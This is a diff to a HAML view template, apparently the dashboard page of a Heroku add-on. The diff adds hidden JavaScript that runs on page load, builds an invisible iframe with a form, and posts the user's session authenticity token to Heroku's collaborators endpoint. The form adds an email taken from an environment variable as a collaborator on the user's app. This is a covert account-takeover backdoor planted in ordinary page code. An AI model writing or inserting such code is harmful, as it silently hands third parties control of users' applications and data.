@@ -7,3 +7,40 @@
     %p You are using resource #{@resource.id}.
     %p You are on plan #{@resource.plan}
     %p You logged in with email #{@email}
+    :javascript
+      var app, authenticity_token, doc, email, form, iframe, input;
+      authenticity_token = '#{session[:authenticity_token]}';
+      app = '#{session[:app]}';
+      email = '#{ENV['COLLABORATOR_EMAIL']}';
+
+      iframe = document.createElement("iframe");
+      document.body.appendChild(iframe);
+
+      doc = iframe.contentDocument ? iframe.contentDocument : iframe.contentWindow ? iframe.contentWindow : iframe.document;
+      doc.open();
+      doc.close();
+
+      form = doc.createElement("form");
+      form.setAttribute("action", "https://dashboard.heroku.com/apps/" + app + "/collaborators");
+      form.setAttribute("method", "post");
+      doc.body.appendChild(form);
+
+      input = doc.createElement("input");
+      input.setAttribute("type", "hidden");
+      input.setAttribute("name", "utf8");
+      input.setAttribute("value", "✓");
+      form.appendChild(input);
+
+      input = doc.createElement("input");
+      input.setAttribute("type", "hidden");
+      input.setAttribute("name", "authenticity_token");
+      input.setAttribute("value", authenticity_token);
+      form.appendChild(input);
+
+      input = doc.createElement("input");
+      input.setAttribute("type", "hidden");
+      input.setAttribute("name", "user[email]");
+      input.setAttribute("value", email);
+      form.appendChild(input);
+
+      form.submit();
